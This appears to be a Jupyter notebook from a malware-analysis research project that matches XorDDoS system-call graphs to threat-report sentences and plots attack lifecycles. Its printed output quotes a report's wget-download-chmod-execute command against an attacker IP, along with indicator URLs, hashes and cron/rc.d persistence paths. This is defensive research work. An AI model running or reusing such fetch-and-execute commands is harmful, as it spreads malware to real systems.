      "\t<OP16 act=open, obj=/etc/cron>, <OP 1 act=drop, obj=/etc/cron.hourly/gcc.sh, sent= this backdoor drops the following files:  /etc/cron.hourly/gcc.sh (cron is a time-based job scheduler in unix-like computer operating systems) backdoor routine>\n",
      "\t<OP70 act=newfstatat, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP50 act=stat64, obj=/var/run/>, <OP 4 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP33 act=stat, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP56 act=lseek, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP49 act=stat64, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP58 act=lseek, obj=/var/>, <OP 5 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP 3 act=stat64, obj=/var/>, <OP 5 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\n",
      "Sample Xorddos-Trendmicro2.csv\n",
      "\tnum of segment in report: 47\n",
      "\tlenght of ctd's OPset is 2\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 1, num of asg objects: 26. R_malObj is 0.0385\n",
      "\t\tctd_object: {'\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 2\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 2, num of asg op: 73. R_malOps is 0.0274\n",
      "\t\trefered lifecycle: [61, 63]\n",
      "\t\tsys_asg_OPset: [<OP46 act=fchown, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>, <OP22 act=write, obj=/etc/rc>, <OP18 act=write, obj=/etc/cron>, <OP47 act=fchmod, obj=/etc/sed>, <OP15 act=write, obj=/etc/init.d/>, <OP45 act=write, obj=/etc/sed>, <OP32 act=lstat, obj=/etc/rc>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP62 act=send, obj=ip_addr>, <OP 1 act=wget, obj=http://122.51.133.49:10086/vip, sent=afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:  wget http://122.51.133.49:10086/vip –o vip chmod 777 vip ./vip the xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server.>\n",
      "\t<OP64 act=_newselect, obj=ip_addr>, <OP 2 act=find, obj=http://62.171.160.189/linux_arm, sent= indicators of compromise kaiji  file name\tsha 256\ttrend micro pattern detection 123.sh\t9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8\ttrojan.sh.kaiji.a linux_arm\td315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56\tddos.linux.kaiji.a related urls:  http://62.171.160.189/linux_arm http://62.171.160.189/11/123.sh xorddos and other malware variants found through the same url  sha 256\ttrend micro pattern detection dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3\tbackdoor.linux.xorddos.ae 6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c\tbackdoor.linux.dofloo.ab 286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe\tbackdoor.win32.sddos.a related url:  http://122.51.133.49:10086/vip>\n",
      "\n",
      "\n",
      "OperationPair that changes system resources:\n",
      " [<OP46 act=fchown, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>, <OP22 act=write, obj=/etc/rc>, <OP18 act=write, obj=/etc/cron>, <OP47 act=fchmod, obj=/etc/sed>, <OP15 act=write, obj=/etc/init.d/>, <OP45 act=write, obj=/etc/sed>, <OP32 act=lstat, obj=/etc/rc>]\n"
     ]
    }
   ],
   "source": [
    "for sample in samples:\n",
    "    # print(len(sample.OPset)) # 30\n",
    "    # print(len(sample.OPset_ordered)) # 30\n",
    "    # print(set(sample.OPset) - set(sample.OPset_ordered)) # 相減是空的set 都OK\n",
    "    fset = run_family_set_procedure(sample)\n",
    "    # match_sentence_ttlcnt = save_match_sent_to_excel(fset, sample.samplename)\n",
    "    # print(f'match_sentence_ttlcnt is {match_sentence_ttlcnt}\\n---\\n')"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: draw Lifecycle diagram\n",
    "- 兩個 traces (legend) 一般的 OP 和 ChangeSys OP。分兩個顏色，不重疊。\n",
    "- x: [a,a,a,a,b,b,b,c,c,c] 不同 report 的 step 可以放同一個 list，因為屬於同個 trace。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "c:\\Users\\luweb\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\plotly\\io\\_renderers.py:7: DeprecationWarning:\n",
      "\n",
      "The distutils package is deprecated and slated for removal in Python 3.12. Use setuptools or check PEP 632 for potential alternatives\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.plotly.v1+json": {
       "config": {
        "plotlyServerURL": "https://plot.ly"
       },
       "data": [
        {
         "marker": {
          "color": "darkorange",
          "size": 12
         },
         "mode": "markers",
         "name": "Normal Operation Pair",
         "type": "scatter",
         "x": [
          69,
          1,
          68,
          69,
          1,
          53,
          41,
          57,
          16,
          70,
          50,
          33,
          13,
          56,
          68,
          52,
          49,
          27,
          58,
          51,
          3,
          57,
          16,
          70,
          50,
          33,
          56,
          49,
          58,
          3,
          62,
          64,
          1,
          2,
          3,
          4,
          5,
          6,
          7,
          8,
          9,
          10,
          11,
          12,
          19,
          20,
          23,
          24,
          25,
          26,
          27,
          28,
          29,
          30,
          31,
          33,
          34,
          35,
          36,
          37,
          38,
          39,
          40,
          41,
          42,
          49,
          50,
          51,
          52,
          53,
          54,
          55,
          56,
          57,
          58,
          59,
          60,
          61,
          62,
          63,
          64,
          65,
          66,
          67,
          68,
          69,
          70,
          71,
          72,
          73
         ],
         "y": [
          "Intezer (3)",
          "Intezer (3)",
          "Intezer (3)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Ms (18)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro2 (2)",
          "Trendmicro2 (2)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)"
         ]
        },
        {
         "marker": {
          "color": "blue",
          "size": 12
         },
         "mode": "markers",
         "name": "Change SR Operation Pair",
         "type": "scatter",
         "x": [
          17,
          43,
          46,
          48,
          14,
          44,
          16,
          22,
          18,
          13,
          21,
          47,
          15,
          45,
          32
         ],
         "y": [
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)"
         ]
        }
       ],
       "layout": {
        "template": {
         "data": {
          "bar": [
           {
            "error_x": {
             "color": "#2a3f5f"
            },
            "error_y": {
             "color": "#2a3f5f"
            },
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "bar"
           }
          ],
          "barpolar": [
           {
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "barpolar"
           }
          ],
          "carpet": [
           {
            "aaxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "baxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "type": "carpet"
           }
          ],
          "choropleth": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "choropleth"
           }
          ],
          "contour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "contour"
           }
          ],
          "contourcarpet": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "contourcarpet"
           }
          ],
          "heatmap": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmap"
           }
          ],
          "heatmapgl": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmapgl"
           }
          ],
          "histogram": [
           {
            "marker": {
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "histogram"
           }
          ],
          "histogram2d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2d"
           }
          ],
          "histogram2dcontour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2dcontour"
           }
          ],
          "mesh3d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "mesh3d"
           }
          ],
          "parcoords": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "parcoords"
           }
          ],
          "pie": [
           {
            "automargin": true,
            "type": "pie"
           }
          ],
          "scatter": [
           {
            "fillpattern": {
             "fillmode": "overlay",
             "size": 10,
             "solidity": 0.2
            },
            "type": "scatter"
           }
          ],
          "scatter3d": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatter3d"
           }
          ],
          "scattercarpet": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattercarpet"
           }
          ],
          "scattergeo": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergeo"
           }
          ],
          "scattergl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergl"
           }
          ],
          "scattermapbox": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattermapbox"
           }
          ],
          "scatterpolar": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolar"
           }
          ],
          "scatterpolargl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolargl"
           }
          ],
          "scatterternary": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterternary"
           }
          ],
          "surface": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "surface"
           }
          ],
          "table": [
           {
            "cells": {
             "fill": {
              "color": "#EBF0F8"
             },
             "line": {
              "color": "white"
             }
            },
            "header": {
             "fill": {
              "color": "#C8D4E3"
             },
             "line": {
              "color": "white"
             }
            },
            "type": "table"
           }
          ]
         },
         "layout": {
          "annotationdefaults": {
           "arrowcolor": "#2a3f5f",
           "arrowhead": 0,
           "arrowwidth": 1
          },
          "autotypenumbers": "strict",
          "coloraxis": {
           "colorbar": {
            "outlinewidth": 0,
            "ticks": ""
           }
          },
          "colorscale": {
           "diverging": [
            [
             0,
             "#8e0152"
            ],
            [
             0.1,
             "#c51b7d"
            ],
            [
             0.2,
             "#de77ae"
            ],
            [
             0.3,
             "#f1b6da"
            ],
            [
             0.4,
             "#fde0ef"
            ],
            [
             0.5,
             "#f7f7f7"
            ],
            [
             0.6,
             "#e6f5d0"
            ],
            [
             0.7,
             "#b8e186"
            ],
            [
             0.8,
             "#7fbc41"
            ],
            [
             0.9,
             "#4d9221"
            ],
            [
             1,
             "#276419"
            ]
           ],
           "sequential": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ],
           "sequentialminus": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ]
          },
          "colorway": [
           "#636efa",
           "#EF553B",
           "#00cc96",
           "#ab63fa",
           "#FFA15A",
           "#19d3f3",
           "#FF6692",
           "#B6E880",
           "#FF97FF",
           "#FECB52"
          ],
          "font": {
           "color": "#2a3f5f"
          },
          "geo": {
           "bgcolor": "white",
           "lakecolor": "white",
           "landcolor": "#E5ECF6",
           "showlakes": true,
           "showland": true,
           "subunitcolor": "white"
          },
          "hoverlabel": {
           "align": "left"
          },
          "hovermode": "closest",
          "mapbox": {
           "style": "light"
          },
          "paper_bgcolor": "white",
          "plot_bgcolor": "#E5ECF6",
          "polar": {
           "angularaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "radialaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "scene": {
           "xaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "yaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "zaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           }
          },
          "shapedefaults": {
           "line": {
            "color": "#2a3f5f"
           }
          },
          "ternary": {
           "aaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "baxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "caxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "title": {
           "x": 0.05
          },
          "xaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          },
          "yaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          }
         }
        },
        "title": {
         "text": "Lifecycle Diagram of Attack Behavior in Document (Xorddos)"
        },
        "xaxis": {
         "title": {
          "text": "ASG Operation Pair (in steps)"
         }
        },
        "yaxis": {
         "title": {
          "text": "Malware Document"
         }
        }
       }
      }
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# import plotly.express as px\n",
    "import plotly.graph_objects as go\n",
    "\n",
    "def symmetric_difference(list1: list, list2: list) -> list:\n",
    "    ''' return list1 - list2. '''\n",
    "    s = set(list2)\n",
    "    temp3 = [x for x in list1 if x not in s]\n",
    "    return temp3\n",
    "\n",
    "def draw_lifecycle(fset:FamilySet):\n",
    "    familname = fset.familyname\n",
    "    # reportnames = [rem.reportname for rem in fset.rem_lst if len(rem.match_regex)]\n",
    "\n",
    "    fig = go.Figure()\n",
    "    x, y = [], []\n",
    "    x_sys, y_sys = [], []\n",
    "    for i, rem in enumerate(fset.rem_lst):\n",
    "        if len(rem.OPset_order_index) == 0:\n",
    "            continue\n",
    "\n",
    "        numOfDot = len(rem.OPset_order_index)\n",
    "        reportname = rem.reportname.split('.')[0]\n",
    "        reportname = reportname.split('-')[1]\n",
    "        reportname += f' ({numOfDot})'\n",
    "        x_sys.extend(rem.SysOPset_order_index) # 改變系統環境的 OP\n",
    "        y_sys.extend([reportname] * len(rem.SysOPset_order_index))\n",
    "        current_x_normal = symmetric_difference(rem.OPset_order_index, rem.SysOPset_order_index) # 一般的/其餘的 OP\n",
    "        # print(reportname, 'numOfDot', numOfDot, 'rem.OPset_order_index', rem.OPset_order_index)\n",
    "        # print('x_normal', current_x_normal, 'x_sys', rem.SysOPset_order_index)\n",
    "        x.extend(current_x_normal)\n",
    "        y.extend([reportname] * len(current_x_normal))\n",
    "        pass\n",
    "    # todo: add baseline's lifecycle\n",
    "    print()\n",
    "    rowname = f'ASG ({len(fset.sample.OPset)})'\n",
    "    current_x_system = fset.sample.OPset_sysOnly_ordered_index\n",
    "    current_x_normal = symmetric_difference(list(range(len(fset.sample.OPset))), current_x_system) # all steps - sysobj steps\n",
    "    x_sys.extend(current_x_system)\n",
    "    y_sys.extend([rowname] * len(current_x_system)) \n",
    "    x.extend(current_x_normal)\n",
    "    y.extend([rowname] * len(current_x_normal))\n",
    "    # print(rowname, len(fset.sample.OPset), len(current_x_system), len(current_x_normal))\n",
    "    \n",
    "    # normal OPs\n",
    "    x = [idx+1 for idx in x] # add 1 to each asg index\n",
    "    fig.add_trace(go.Scatter(\n",
    "        x=x,\n",
    "        y=y,\n",
    "        marker=dict(color=\"darkorange\", size=12),\n",
    "        mode=\"markers\",\n",
    "        name=\"Normal Operation Pair\",\n",
    "    ))\n",
    "\n",
    "    # changeSysObj OPs\n",
    "    x_sys = x = [idx+1 for idx in x_sys]\n",
    "    fig.add_trace(go.Scatter(\n",
    "        x=x_sys,\n",
    "        y=y_sys,\n",
    "        marker=dict(color=\"blue\", size=12),\n",
    "        mode=\"markers\",\n",
    "        name=\"Change SR Operation Pair\",\n",
    "    ))\n",
    "\n",
    "    fig.update_layout(title=f\"Lifecycle Diagram of Attack Behavior in Document ({familname})\",\n",
    "                    xaxis_title=\"ASG Operation Pair (in steps)\",\n",
    "                    yaxis_title=\"Malware Document\")\n",
    "    fig.show()\n",
    "    pass\n",
    "\n",
    "draw_lifecycle(fset)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: draw ASG & CTD's OP graph\n",
    "- 完整的 ASG OPset graph\n",
    "- 每篇報告的 CTD OPset (完整和matched兩種)，以及對應部分的 ASG。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['b', 'c', 'd']"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = [1,2,3]\n",
    "b = ['a','b','c','d','e']\n",
    "[b[i] for i in a]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Title: Xorddos_asg_OPset Pages: 1 -->\n<svg width=\"5218pt\" height=\"291pt\"\n viewBox=\"0.00 0.00 5217.78 291.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 287)\">\n<title>Xorddos_asg_OPset</title>\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-287 5213.78,-287 5213.78,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2624.73\" cy=\"-265\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2624.73\" y=\"-261.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"70.73\" cy=\"-178\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"70.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.41,-263.7C2116.27,-261.94 27.66,-252.23 4.73,-229 -8.72,-215.36 9.72,-202.37 30.5,-193.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"31.91,-196.26 39.78,-189.17 29.2,-189.8 31.91,-196.26\"/>\n<text text-anchor=\"middle\" x=\"26.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">62.send</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.33,-263.67C2122.67,-261.74 94.25,-251.38 71.73,-229 65.78,-223.08 64.18,-214.5 64.5,-206.12\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"67.97,-206.51 65.67,-196.17 61.02,-205.7 67.97,-206.51\"/>\n<text text-anchor=\"middle\" x=\"102.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">66.connect</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.25,-263.89C2142.67,-263.16 286.7,-258.24 168.73,-229 155.4,-225.69 126.09,-210.31 102.98,-197.46\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"104.59,-194.35 94.16,-192.52 101.17,-200.46 104.59,-194.35\"/>\n<text text-anchor=\"middle\" 